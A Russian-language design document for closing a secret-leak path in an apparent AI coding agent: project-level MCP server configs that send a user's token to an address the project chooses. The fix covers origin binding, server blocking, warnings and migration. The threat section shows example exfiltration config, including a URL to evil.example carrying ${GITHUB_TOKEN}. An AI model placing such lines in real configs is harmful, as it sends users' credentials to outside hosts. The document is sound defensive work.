## Context

### Угроза

Проектные слои — `<cwd>/.codelab/config.yaml` (слой `project`) и `<cwd>/.codelab/config.local.yaml` (слой `projectLocal`). `config.yaml` обычно коммитят, и пишет его не пользователь. Без доверия (`trusted_projects`) `mcp.servers` обоих проектных слоёв отбрасываются (`trust.dart:85`, spec agent-configuration «Доверие к проектному конфигу»). С доверием доступно следующее:

- HTTP-сервер проекта со своим `url` и ссылкой на секрет пользователя в `headers`: `Authorization: "Bearer ${secret:codelab/mcp/github/authorization}"`. Рантайм раскроет её перед подключением (`agent_runtime.dart:1839`, `_expandServerSecrets`), и токен уйдёт на адрес проекта.
- То же с переменной окружения: `Authorization: "Bearer ${GITHUB_TOKEN}"`. Её значение подставляет загрузка (`resolve.dart`, `_buildMcpServer` → `_interpolate`).
- То же через адрес: `url: https://evil.example/${GITHUB_TOKEN}`. `${ENV}` в `url` раскрывается при загрузке (`resolve.dart:1487`, `expand(..., allowSecrets: false)`).

Доверие к проекту означает «разрешить его правила и серверы», а не «отдать ему мои ключи» (D23 change `require-project-folder`). С D21 того же change каждая сессия читает проектные слои своей папки (`ProjectConfigLoader`). Поэтому риск касается любой открытой папки доверенного проекта, а не только корня процесса.

### Как сейчас устроено (сверено с `develop`, `d99cc6b5`)

**Загрузка `mcp.servers`** (`codelab_agent_core/lib/src/config/resolve.dart`):
- `_mcpServers` (1384) → `_mcpServer` (1412) → `_buildMcpServer` (1443). Происхождение сервера — `_serverOrigin(name)` (1400): последний слой, объявивший элемент с этим `name`.
- Слияние (`merge.dart`, `_mergeServers`) заменяет элемент с тем же `name` **целиком**. Поэтому сервер всегда собран из одного слоя: проектный слой не может дописать заголовок к серверу пользователя или сменить только его `url`. Правило 2 D23 для MCP уже выполнено конструкцией. Отдельного шага вроде `applyProviderGroupRule` не нужно.
- `${ENV}` раскрывается в `url`, `args`, `env.*`, `headers.*` (spec agent-configuration «Подстановка переменных окружения»). `${secret:…}` допустим только в `env.*` и `headers.*`: он остаётся шаблоном в `McpServerConfig.secretValues` и раскрывается рантаймом перед каждой попыткой подключения. В `url` и `args` ссылка на секрет — проблема загрузки.
- Происхождение уже известно (`origin` в `_buildMcpServer`), но привязки к origin для MCP нет: `_unboundReferences` (1187) и `ProviderKeyBinding` (`provider_binding.dart`) смотрят только `providers.*`.
- Выключенный сервер (`enabled: false`) строится «тихо»: его проблемы и предупреждения откатываются (1428–1440), а сам элемент доходит до коннектора с `enabled: false`.

**Подключение:**
- Коннектор (`codelab_agent_mcp/lib/src/connector.dart:380`, `_connectOnce`) вызывает функцию раскрытия только для серверов `origin: config` с непустыми `secretValues`.
- Отказ раскрытия — `McpSecretsException(reason)`. Транспорт не открывается, сервер переходит в `failed`, `lastError` = `reason` (обрезка до 200 символов, `_lastErrorLimit`, `connector.dart:37`), затем повтор по расписанию (`_fail`, 530). Тот же путь у ссылки, в которую вписан сам секрет (`UnusableSecretReference`, `secret reference … looks like a secret value, not a name`).
- Stdio-процесс сервера (`codelab_agent_io/lib/src/mcp/stdio_process_transport.dart:150–155`) стартует с `includeParentEnvironment: false`. Окружение — allowlist хоста плюс `env` сервера. Так что `${GITHUB_TOKEN}` в `env` передаёт процессу переменную, которой он иначе не видит. При этом сам процесс — произвольный код от имени пользователя: он может прочитать файлы пользователя, включая `$CODELAB_HOME/secrets.yaml` бэкенда `file`.

**Перезагрузка:**
- `planConfigReload` (`config_reload_plan.dart`, правило 3) применяет удаление и выключение сразу. Stdio-сервер с новыми параметрами и HTTP-сервер с подстановкой `${…}` в `url`, `headers` или `env` откладываются до перезапуска (R0-1, R0-4).
- Шаг 7а `_applyConfigMcp` заменяет серверы конфига живых сессий через `replaceServers` по `sameConnection`.
- Сессии других папок (`_isolated`, D21) он пропускает (`agent_runtime.dart:1036`). Их снимок фиксирован до следующего открытия (Q19 (a) `require-project-folder`).

**Мигратор** (`codelab_agent_io/lib/src/secrets/secret_migrator.dart`):
- Литерал в `headers` или `env` элемента `mcp.servers` превращается в `${secret:…}` **в том же файле**. D26 `require-project-folder` прямо оставил это так: «MCP-серверы закоммиченного `config.yaml` переносятся в том же файле, как сейчас: D23 для `mcp.servers` — отдельный change (Q15 (a))».
- Литералы в `args` не переносятся: строка `not migrated` с подсказкой `--env`.
- Для провайдеров D26 и C5.6 переносят группу в `config.local.yaml` и проверяют чужие ссылки через `ProviderKeyBinding` (1020).

**Desktop** (`apps/codelab_desktop/lib/features/settings/`):
- Страница «MCP servers» пишет только слои `user` и `projectLocal` («Save to User config» / «This project only»).

Код (`resolve.dart:1428`) и более поздние требования (agent-mcp-client «Переподключение и состояние серверов сессии»: «Сервер конфига с `enabled: false` SHALL приходить коннектору с признаком `McpServerConfig.enabled == false`»; agent-runtime, строка 603 спецификации) передают такой сервер дальше с `enabled: false`. 3. **`15-configuration.md`, таблица доверия**, строка «`${secret:<name>}` в `headers`, `env`»: условие — «проект в `trusted_projects`». После этого change для HTTP-серверов добавляется привязка к origin. Строка правится задачей 0.1.

## Goals / Non-Goals

**Goals:**
- Секрет или переменная пользователя из ссылки HTTP-сервера проектного слоя уходит только на адрес, с которым её связал пользователь. Действует одинаково для корня процесса и для папки любой сессии (D21).
- Значение непривязанной ссылки не читается: ни хранилище, ни окружение. Оно не попадает в лог, `lastError`, `/mcp list`, `config check`, UI и журнал. Маркер в тестах — `sk-test-leak-0123456789`.
- Пользователь видит, почему сервер не подключён, и что сделать.
- Одна реализация правила в ядре — для загрузки, мигратора и привязок провайдеров.

**Non-Goals:**
- ACP, серверы `session/new.mcpServers`.
- Stdio-серверы проектных слоёв — решение Q1 (a).
- Новый UI списка страницы «MCP servers» (Q5 (a)).
- Хранилище секретов, `SecretResolver`, бэкенды.

## Decisions

### D1. Область правила — HTTP-серверы проектных слоёв (решение Q1 (a))

Правило действует для элементов `mcp.servers` с `type: http`, если сервер в итоге слияния пришёл из слоя `project` или `projectLocal` (`_serverOrigin`). Судятся ссылки:
- `${secret:<name>}` и `${NAME}` в значениях `headers.*`;
- `${NAME}` в `url` (решение Q4 (a); аналог Q16 (a) для `base_url` провайдера). `${secret:…}` в `url` правило не судит: как и до change, это проблема загрузки `secret references ${secret:…} are allowed only in env and headers values`, конфиг невалиден, до привязки дело не доходит.

Литералы не ссылки. Литеральный токен в заголовке закоммиченного файла — это секрет проекта, а не пользователя; его судят `config.secret.in_file` и `secret migrate`.

Stdio-серверы правило не судит. Проект и так задаёт исполняемую команду (`command`, `args`). Запущенный процесс — произвольный код от имени пользователя, с доступом к его файлам: к `secrets.yaml` бэкенда `file`, к dotfiles с токенами, к `~/.config`. Привязка `env` к «адресу» здесь невозможна: адреса нет, есть только команда. Ограничение «ссылки stdio только из `config.local.yaml`» дало бы видимость защиты без защиты. При этом оно сломало бы основной сценарий командного конфига: `npx -y @modelcontextprotocol/server-github` с `env: {GITHUB_PERSONAL_ACCESS_TOKEN: "${GITHUB_TOKEN}"}`. Для stdio граница безопасности — доверие (CFG-3), как сейчас. Это записано остаточным риском с условием пересмотра: хранилища ОС (`add-agent-os-secret-backends`) делают секрет недоступным процессу без ссылки.

- Отклонено (вариант Q1 (b)): ссылки stdio-сервера проектного слоя только из `config.local.yaml`, условия (b) нет. Цена — сломанный командный сценарий. Выигрыш реален только при хранилище ОС после 1.0.
- Отклонено: судить и литералы. Литерал не принадлежит пользователю, его утечка — забота автора файла.

### D2. Правило 2 D23 для MCP выполнено слиянием по `name`

Сервер собирается из одного слоя целиком (`_mergeServers`). Проектный слой не может:
- унаследовать заголовок или `env` сервера пользователя к своему `url`;
- сменить `url` сервера пользователя, оставив его заголовки.

Новый код не нужен. Требование agent-configuration «MCP-серверы конфигурации» (MODIFIED) называет это правилом группы, а задача 1.1 закрепляет тестом. Без теста будущее поэлементное слияние (как у провайдеров) молча открыло бы утечку.

- Отклонено: отдельный шаг `applyMcpGroupRule` по образцу `applyProviderGroupRule` — он ничего не делал бы (§13).

### D3. Условия (a) и (b), origin и общая привязка

Ссылка из D1 разрешается, только если выполнено одно из условий:
- **(a)** сервер задан в `config.local.yaml` (слой `projectLocal`) доверенного проекта. Недоверенный `projectLocal` сюда не доходит: доверие отбрасывает его `mcp.servers`;
- **(b)** глобальные слои (`user`, `appStorage`, `--config`/`CODELAB_CONFIG`, окружение, флаги) связывают ту же ссылку — тот же вид (секрет или переменная) и то же имя — с тем же origin `scheme://host:port` (хост без учёта регистра, порт по умолчанию схемы подставляется).

Как в D23:
- **Origin сервера** — `originOf` от `url`, где `${ENV}` раскрыт только для сравнения: значение наружу не уходит (`providerOrigin`). Если `url` не разобрался или переменная не задана, origin неизвестен, и ни одна ссылка не привязана по (b).
- **Привязки (b)** собираются из исходных деревьев глобальных слоёв, а не из собранного снимка: в снимке `${ENV}` уже раскрыт. Как в C5.1 — по слоям до правила группы провайдеров (`_Builder.sourceLayers`).
- **Одно множество привязок** для провайдеров и MCP. `ProviderKeyBinding.fromLayers` дополнительно собирает ссылки `headers.*` и `${ENV}` из `url` глобальных HTTP-серверов MCP с origin их `url`. Ссылка — это пара «вид, имя», а утечка определяется адресом назначения. Ключ `codelab/github`, связанный пользователем с `https://api.github.com` через провайдера, на тот же origin уйдёт и через MCP-сервер — это не утечка. Глобальные stdio-серверы привязок не дают: у них нет адреса.
- **Типы для мигратора.** Ссылки сервера даёт новая функция `mcpServerReferences(Map server)` рядом с `providerReferences`. Тип ссылки — существующий `ProviderReference` (`field` — `url`, `headers.<имя>`).

Имена `ProviderKeyBinding` и `ProviderReference` не меняются. Это публичный API ядра, экспортированный через `show` для мигратора (C5.6). Переименование тронуло бы ядро, мигратор и `public_api_test.dart` ради имени. Doc-комментарии меняются: привязки собираются из провайдеров и HTTP-серверов MCP (§15: устаревший комментарий — дефект).

- Отклонено: отдельный `McpKeyBinding`. Вторая копия правила origin и сравнения ссылок (§14), а случай «тот же ключ, тот же origin, другой тип записи» он отверг бы без причины.
- Отклонено: переименование в `KeyOriginBinding` — см. выше.

### D4. Непривязанный сервер: в списке, не подключается, `failed` с причиной (решение Q2 (a))

Если у сервера есть хоть одна непривязанная ссылка, при загрузке (`_buildMcpServer`):
- **Не читается ничего.** Значения с непривязанными ссылками не раскрываются: `_interpolate` для них не вызывается, переменная не читается из `environment`. Такие заголовки в сервер не попадают — ни в `headers`, ни шаблоном в `secretValues`.
- **Адрес без значения.** Непривязанные `${ENV}` в `url` вырезаются, как у `base_url` провайдера (`resolve.dart`, `_provider`). Если вырезанный адрес не разбирается, ставится `https://unbound.invalid`. Адрес не используется: транспорт не открывается.
- **Признак блокировки.** Сервер получает `McpServerConfig.blockedReason` — готовый текст для `lastError` (D5). Сервер остаётся в `CoreConfig.mcpServers` с прежними `name`, `enabled` и сроками.
- **Предупреждение.** Пишется `config.mcp.key_unbound` на каждую непривязанную ссылку (D5).

При подключении коннектор (`_connectOnce`) проверяет `blockedReason` первым: до функции раскрытия и до фабрики транспорта. Сервер с причиной получает отказ попытки `(null, blockedReason)`. Дальше всё как у отказа раскрытия: `failed`, `lastError`, `mcp.server.failed {server, transport, reason}` на первом сбое, повтор по расписанию.

Повторы сохраняются ради единообразия с прецедентом ссылки-значения (`UnusableSecretReference`, D4 change `add-config-literal-secrets-and-migrate`). Попытка без ввода-вывода: ни хранилища, ни сети, ни процесса. Подпись `failed · retry in N s` на странице вводит в заблуждение, но так же устроен этот прецедент. Отдельное состояние «заблокирован» потребовало бы нового значения `McpServerState`, а оно видно клиентам через порт статуса встроенного агента. Решение Q5 (a): не в этом change.

Свойство безопасности держит загрузка, а не коннектор. Значений нет в объекте конфигурации. Поэтому коннектор, который не знает `blockedReason` (фейк в тестах, сторонний хост порта), в худшем случае подключится **без** заголовка, но не отправит ключ.

`blockedReason` сохраняется в `withEnabled` и `withSecrets`. Выключенный сервер, включённый `/mcp enable` или `setEnabled`, тоже получает `failed` с причиной. Предупреждение у выключенного сервера откатывается вместе с остальными («тихая» сборка, 1428–1440) — как у всех его предупреждений.

- Отклонено (Q2 (b)): подключать без непривязанного заголовка. Сервер проекта получит запросы без аутентификации и ответит `401` или будет работать с правами анонима. Пользователь не увидит причины, а модель получит инструменты сервера, который сам выбрал репозиторий.
- Отклонено (Q2 (c)): отбрасывать сервер при загрузке, как недоверенный. Сервер исчезает из `/mcp list` и панели «Agent status», и причина видна только в логе.

### D5. Тексты и наблюдаемость (§16, CFG-10)

- **Предупреждение загрузки** `config.mcp.key_unbound`, уровень `warning`, на каждую непривязанную ссылку:
  - ключ — путь ссылки: `mcp.servers[<server>].headers.<Name>` или `mcp.servers[<server>].url`;
  - источник и позиция — слой сервера;
  - поля — `{server, source, reference_kind}` (`secret` | `env`);
  - текст — `the reference is bound to another address and is not used`.

  Имени ссылки в полях нет: так же у `config.provider.key_unbound`. Имя — в `lastError`. Пишет его общая `logConfigWarnings` (`codelab_agent_io`), в том числе для загрузки папки сессии (D21). `config check` печатает его в общем списке предупреждений.
- **`blockedReason` / `lastError`:** `key bound to another address: move the server to config.local.yaml or the user config (<reference>)`, где `<reference>` — `secret <name>` или `variable <NAME>` первой непривязанной ссылки. Имя печатается, только если оно проходит правило имени (`SecretNames.problem(name) == null` у секрета, `[A-Za-z_][A-Za-z0-9_]*` у переменной) и не похоже на значение секрета (`literalSecretTag(name, asName: true) == null`); иначе вместо `secret <name>` / `variable <NAME>` пишется `a reference`. Почему оба условия: недопустимое имя — часто сам ключ, вписанный вместо имени, а шаблоны `literalSecretTag` ловят не все форматы ключей. Совет стоит до имени: `lastError` обрезается до 200 символов, а имя секрета бывает до 128.
- Пути файла в `lastError` нет: путь есть в предупреждении, а длинный путь вытеснил бы совет.
- Значение секрета или переменной никогда не попадает в лог, `lastError`, `McpServerSummary`, `/mcp list`, `config check`, журнал сессии и UI. Адрес в логах — только origin, как у остальных событий MCP (spec agent-mcp-client «Наблюдаемость MCP без секретов»).

### D6. Перезагрузка, сессии других папок, `/mcp`

- **`sameConnection`** обеих ветвей учитывает `blockedReason`. Правка глобального слоя меняет вердикт для неизменённого проектного сервера, и шаг 7а заменяет его в живых сессиях:
  - **снятие привязки** — пользователь убрал ссылку или сменил адрес своего сервера: подключённый проектный сервер закрывается и переходит в `failed` с причиной. Это ужесточение, оно применяется сразу;
  - **появление привязки** — тоже применяется сразу. Адрес проектного сервера не менялся, согласие дал пользователь своей правкой глобального слоя. R0-4 откладывает отправку секрета на *новый* адрес. Здесь адрес прежний, а правка, создавшая привязку, сама подчиняется R0-4 у глобального сервера.
- **Сессии других папок** (D21) получают правило при своей загрузке (`loadForProject` вызывает тот же `resolveConfig`). Перезагрузка корня их не трогает (Q19 (a)), поэтому вердикт меняется со следующим открытием.
- **`/mcp reload <name>`** и «Reconnect» на странице — новая попытка с той же причиной. `/mcp list` показывает `failed` и `lastError`.

### D7. `secret migrate` переносит HTTP-сервер закоммиченного `config.yaml` в `config.local.yaml` (решение Q3 (a))

**Пробел.** После D4 ссылка `${secret:…}`, которую мигратор пишет в `config.yaml` вместо литерала, не привязана. Сервер ломается, а команда возвращает `0`. Это тот же пробел, что D26 закрыл для провайдеров.

**Решение** — для HTTP-сервера `mcp.servers[<name>]` из `config.yaml` доверенного проекта, у которого есть находка в `headers.*` (находка только в `env.*` переезд не запускает): переезжают **все** шаблонные находки сервера — в `headers.*` и в `env.*`.
- **В `config.local.yaml`** записывается копия элемента целиком (сервер — единица слияния, D2). У каждой находки литерал заменён ссылкой `${secret:<name>}`, как сейчас.
- **В `config.yaml`** элемент остаётся без ключей `headers.<Name>` и `env.<KEY>` с находками. Остальное (`name`, `type`, `url`, прочие заголовки, сроки) — общая часть команды. Секрет уходит из репозитория. Члены команды сохраняют определение сервера и добавляют свой ключ сами.
- **Работа сервера.** Он продолжает работать: элемент `config.local.yaml` заменяет элемент `config.yaml` по `name`, а ссылка разрешается по условию (a).

Технические детали — по образцу D26:
- **Выбор слоёв.** Перенос — часть обработки находок слоя `project`. `--project`, `--all` и «Move secrets» пишут и `config.local.yaml`. Доверие писателя проверяется для обоих файлов до хранилища.
- **Порядок записи.** Секреты сохраняются до первой записи конфига (L7). Файлы пишутся в порядке `user`, `local`, `project`. Сбой между записями оставляет рабочий конфиг: `config.local.yaml` уже заменяет элемент. Код `1`, stderr называет сохранённые секреты и оставшийся файл. Итог обоих файлов проверяется вместе до хранилища (R8-10).
- **Чужие ссылки не переносятся (C5.6).** Перенос снимает с ссылок проверку origin, поэтому каждая ссылка элемента, которую мигратор не создаёт сам из литерала, должна быть привязана глобальными слоями по (b). Это `${secret:…}` и `${ENV}` в `headers`, `${ENV}` в `url`; проверка — `ProviderKeyBinding` по непроектным слоям. Иначе сервер не переносится: строка `not migrated: mcp.servers[<name>] in <path>: <reference> is not bound to this address by the user config; move it by hand`. Файлы этого сервера и хранилище не меняются, литерал остаётся в `config.yaml`, сервер по-прежнему заблокирован D4.
- **Значение, которое хранилище не примет** (`secretValueProblem`: перевод строки — например, PEM; больше 64 КиБ; непарный суррогат). Если так хоть с одной находкой сервера, сервер не переносится: строка `not migrated: mcp.servers[<name>] in <path>: a value of this server cannot be stored; move it by hand`. `config.yaml`, `config.local.yaml` и хранилище для этого сервера не меняются, и **все** находки сервера остаются на месте. Это отличие от общего правила (строка `… cannot be stored (<причина>)`, остальные находки переносятся): копия элемента унесла бы в `config.local.yaml` литерал, который хранилище не примет и писатель отверг бы, а перенос части находок оставил бы сервер наполовину в `config.yaml`.
- **В `config.local.yaml` уже есть элемент с этим `name`**, в том числе `{name, enabled: false}` от «Disable here». Элементы молча не сливаются: строка `not migrated: mcp.servers[<name>] in <path>: config.local.yaml already defines this server; move it by hand`, оба файла этого сервера не меняются. Исключение — повтор после сбоя (R8-11): элемент `config.local.yaml` совпадает с тем, что записал бы перенос, ссылки — на секреты с теми же значениями. Тогда из `config.yaml` удаляются только ключи с находками.
- **Stdio-серверы** `config.yaml` переносятся в том же файле, как сейчас: правило D1 их не судит, ссылка работает. Литералы в `args` — прежняя строка `not migrated` с подсказкой `--env`.
- **Вывод.** Строки находок (`Moved …` / `Reused secret …`), затем `Moved mcp.servers[<name>] (with its secrets) to <config.local.yaml>; removed the secret values from <config.yaml>`. Новый вариант отчёта `SecretMcpServerMovedItem` с `describe()`, экспорт — как у `SecretProviderMovedItem` (`codelab_agent_io`, `codelab_setup/io.dart`, `codelab_embedded/io.dart`). `--dry-run` показывает тот же план.

- Отклонено: удалить элемент из `config.yaml` целиком. Команда теряет определение сервера после коммита, хотя секрет проекта — только заголовок.
- Отклонено (Q3 (b)): оставить ссылку в `config.yaml`, как сейчас. Сервер ломается молча с кодом `0`.
- Отклонено (Q3 (c)): отказ `not migrated` для HTTP-серверов `config.yaml`. Секрет остаётся в репозитории, а работу, которую команда может сделать сама, пользователь делает руками.

### D8. Где проверяется

Одно место — `_Builder._buildMcpServer` (`resolve.dart`), до `_interpolate` значений `headers` и до `expand` для `url`. Слой сервера уже известен (`origin` = `_serverOrigin(name)`), привязки — `_keyBinding` того же `_Builder` (D3). Проверки в рантайме и в функции раскрытия не нужны. Значений в объекте нет, а коннектор только переводит причину в состояние (D4).

### D10. Исправление устаревшей фразы agent-configuration

В требовании «MCP-серверы конфигурации» фраза «Сервер с `enabled: false` НЕ SHALL попадать в `CoreConfig.mcpServers`» заменяется формулировкой agent-mcp-client и agent-runtime: сервер приходит с `enabled: false` и пишет `mcp.server.skipped {reason: "disabled in config"}`. Поведение не меняется, спецификация приводится к действующим требованиям и коду (расхождение 1). Молчаливой правки нет: она названа здесь и в proposal.

### D11. ACP

ACP не меняется: ни методов, ни полей, ни кадров, ни кодов ошибок. Непривязанный сервер не мешает `session/new` и `session/load`: сессия создаётся, сервер в `failed` (spec agent-runtime «MCP-серверы сессии», шаг 3). Серверы `session/new.mcpServers` правило не трогает: `${secret:…}` в них уже литерал, а `${ENV}` не раскрывается.

### D12. Предупреждение о stdio-сервере закоммиченного конфига (решение пользователя по остаточному риску Q1)

Поведение Q1 (a) не меняется: stdio-серверу достаточно доверия, ссылка раскрывается, сервер подключается. Но пользователь должен видеть, что закоммиченный конфиг передаёт его секрет команде репозитория.

- **Когда.** Stdio-сервер из слоя `project` (`.codelab/config.yaml` доверенного проекта; не `projectLocal`, не глобальные слои) ссылается на `${secret:…}` в значении `env.*`. `${secret:…}` в `args` — по-прежнему проблема загрузки, до предупреждения дело не доходит. `${NAME}` предупреждения не даёт: значение переменной окружения процесса — не содержимое хранилища, а пользователь, задающий переменную для команды, видит её в своём окружении (§13: без шума на каждом `npx … ${TOKEN}`).
- **Событие** `config.mcp.stdio_secret_reference`, уровень `warning`, **одно на сервер**:
  - ключ — `mcp.servers[<server>]`; источник и позиция — слой `project`;
  - поля — `{server, source}`; имени секрета нет (по образцу `config.mcp.key_unbound`, где имя тоже не входит в поля), значения — тем более;
  - текст — `a stdio server from the committed project config receives a secret reference; it runs as you, so move it to config.local.yaml if you did not write it`. Текст только ASCII: он печатается в терминал и лог.
- **Где видно.** Пишет общая `logConfigWarnings` (журнал загрузки агента, в том числе загрузка папки сессии, D21); `config check` печатает строку `warning: <location>: mcp.servers[<server>]: <текст>`.
- **Выключенный сервер** — без предупреждения («тихая» сборка, как у всех его предупреждений).
- **Где проверяется.** `_Builder._buildMcpServer` (`resolve.dart`), ветка `stdio`, по слою `origin` и шаблонам `secretValues` с `SecretReference`.

- Отклонено: предупреждение и для `${NAME}` — шум для основного командного сценария.
- Отклонено: имя секрета в полях — по аналогии с `key_unbound`; имя видно в файле по позиции предупреждения.

## Risks / Trade-offs

- **[Утечка через stdio-сервер доверенного проекта]** → Принято по Q1 (a): доверие к проекту — согласие на исполнение его команд, а команда видит файлы пользователя. Пользователь видит такой сервер закоммиченного конфига по предупреждению `config.mcp.stdio_secret_reference` (D12). **Пересмотр Q1 ОБЯЗАТЕЛЕН** (решение пользователя) при включении хранилищ ОС (change `add-agent-os-secret-backends`): тогда `${secret:…}` в `env` становится единственным способом получить секрет без запроса ОС, и доверия перестаёт хватать. Заметка об этом записана в design.md того change.
- **[Закоммиченный `config.local.yaml`]** → Остаточный риск D23 (Q17): условие (a) верит `config.local.yaml` доверенного проекта. Мигратор `.gitignore` не меняет.
- **[Совместимость]** → Доверенные проекты с HTTP-сервером в закоммиченном `config.yaml` и ссылкой на ключ пользователя теряют подключение. Как поправить, видно в `lastError`, `config check` и строке панели «Agent status»; мигратор и «This project only» делают это за пользователя. Цена та же, что Q14 (a).
- **[`failed · retry in N s` у заблокированного сервера]** → Повторы без ввода-вывода, как у прецедента ссылки-значения. Отдельное состояние не вводится (Q5 (a)).
- **[Гонки и поздние события (§9, §12)]** → Новых асинхронных путей нет. Вердикт вычисляется при загрузке. Коннектор проверяет признак синхронно в начале попытки, поэтому поздняя попытка старого поколения (`stale()`) отбрасывается как сейчас. Замена сервера при перезагрузке идёт через существующую очередь `_enqueueMcp` и счётчик поколений.
- **[Привязка, появившаяся живой перезагрузкой]** → Применяется сразу (D6). Адрес проектного сервера прежний, а правка глобального сервера, создавшая привязку, сама подчиняется R0-4. Допустимая граница.
- **[Привязка через провайдера]** → Ссылка, связанная пользователем с origin через провайдера, привязывает и MCP-сервер с тем же origin (D3). Адрес назначения тот же, утечки нет.
- **[Permissions (§10)]** → Правило — часть границы безопасности конфигурации, а не permission flow: одобрений не добавляет и не снимает. Containment `fs/*` и `terminal/*` не затронут.
- **[Web-безопасность]** → Ядро, `codelab_agent_mcp` и основные барели мостов новых импортов не получают.

## Migration Plan

- Код выходит одним change, без флага: это закрытие утечки (приоритет 1).
- Проекты, которых это касается, видят `config.mcp.key_unbound` в `config check` и `failed` с советом в `/mcp list` и в панели «Agent status». Исправление: «Move secrets» / `codelab secret migrate --project` (D7), «This project only» на странице «MCP servers», `codelab mcp add --local` или перенос сервера в пользовательский конфиг.
- Откат — откат change; формат конфигов и хранилища не меняется.

## Решённые вопросы

Все — вариант (a), 2026-11-13. Дельты и задачи им соответствуют.

- **Q1 (a)** (решение пользователя) — stdio-серверам проектного слоя достаточно доверия, привязки нет (D1). Отклонены: (b) ссылки stdio только из `config.local.yaml`; (c) (b) вместе с хранилищами ОС. - **Q3 (a)** (решение пользователя) — мигратор копирует HTTP-сервер в `config.local.yaml`, из `config.yaml` удаляются только ключи `headers`/`env` с находками; чужая непривязанная ссылка или конфликт с элементом `config.local.yaml` — `not migrated` (D7). Отклонены: (a2) удалить элемент из `config.yaml` целиком; (b) ссылка в том же файле; (c) отказ.

- **Q5 (a)** (решение пользователя) — отдельного показа заблокированного сервера нет: `lastError` в панели «Agent status», `/mcp list` и `config check`; новое состояние `McpServerState.blocked` и пометка строки — отдельным change при необходимости.
